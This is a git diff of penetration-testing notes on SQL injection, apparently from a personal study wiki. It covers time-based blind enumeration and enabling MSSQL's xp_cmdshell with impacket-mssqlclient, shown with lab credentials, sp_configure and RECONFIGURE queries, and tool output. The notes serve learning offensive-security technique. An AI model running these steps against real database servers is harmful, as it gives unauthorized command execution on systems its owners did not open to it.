@@ -1,4 +1,5 @@
 
+
 # SQL Injection
 [SQL](../../coding/languages/SQL.md) injection is a type of attack which leverages poor security practices when implementing SQL in an application. If user input is not properly sanitized, then an attacker can use SQLi to manipulate backend databases by making queries to them using SQL.
 ![My notes on SQLi](../../cybersecurity/TTPs/exploitation/injection/SQLi.md)
@@ -31,24 +32,28 @@ In [SQL](../../coding/languages/SQL.md) the `IF()` function checks the first par
 So, time based blind SQLi can also be used for enumeration. If the user is false (doesn't exist), the application should immediately error (or do whatever behavior we observed it doing for usernames which don't exist). If the user is true (does exist), then the application should time-out for 3 seconds before returning any content.
 # Manual Code Execution
 Depending on how the SQL server is configured on a target, we can use it to *achieve code execution*. For example, in [MSSQL](../../CLI-tools/windows/MSSQL.md) servers the `xp_cmdshell` function takes a string and passes it to a command shell for execution. Any output returned from the shell is returned by MSSQL as rows or text. Usually, it is disabled by default. But once it's enabled, it can called in a SQL query by using the `EXECUTE` keyword.
-## `xp_cmdshell` 
+## In MSSQL
 To enable `xp_cmdshell`, we can use the `impacket-mssqlclient` tool. Once we're connected to the target MSSQL server, we can give the following command query:
 ```sql
-EXECUTE sp_configure 'show advanced options', 1;
+> EXECUTE sp_configure 'show advanced options', 1;
+
+
+INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
 ```
 `sp_configure` is another MSSQL command ('procedure') which displays global configuration settings for the current server. You can use it to view options or modify settings. Additionally, you can give it `1` or `0` as a parameter to enable or disable specific commands:
 ```sql
 -- Use sp_configure to enable "show advanced options"
-kali@kali:~$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
+impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
 Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 ...
 SQL> EXECUTE sp_configure 'show advanced options', 1;
 [*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
-SQL> RECONFIGURE;
 
 -- Use sp_configure to enable "xp_cmdshell"
 SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
 [*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+
+-- Use RECONFIGURE to apply the changes:
 SQL> RECONFIGURE;
 ```
 Once a change is made, run `RECONFIGURE` to apply it. Now we can execute any Windows shell command we want.
